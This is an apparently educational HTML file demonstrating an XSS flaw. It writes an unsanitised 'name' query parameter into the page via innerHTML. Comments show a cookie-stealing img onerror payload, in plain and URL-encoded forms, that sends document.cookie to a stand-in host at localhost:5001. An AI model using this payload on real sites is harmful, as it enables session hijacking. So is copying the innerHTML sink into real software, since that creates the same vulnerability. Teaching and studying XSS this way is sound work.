<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>XSS Example</title>
</head>

<body>

   <!-- Vulnerable Code -->
   <div>
      Welcome, <span id="username"></span>!
      <!-- this will get added once attacker does session hijacking -->
      <!-- <img src="does-not-exist"
         onerror="var img=document.createElement('img');img.src=`localhost:5001/cookie?data=${document.cookie}`;document.querySelector('body').appendChild(img)" /> -->
   </div>

   <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get('name');
      document.getElementById('username').innerHTML = name;
      // To simulate the Vulnerability
      // If user has some cookies stored
      document.cookie = "name=Pradnesh";
      // Attacker injects the query params as below, attacker puts a script which retrieves and sends the cookie data to other site 
      // "http://127.0.0.1:5500/example1.html?name=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%3Ddocument.createElement('img')%3Bimg.src%3D%60localhost%3A5001%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D%60%3Bdocument.querySelector('body').appendChild(img)%22%2F%3E"
   </script>

</body>

</html>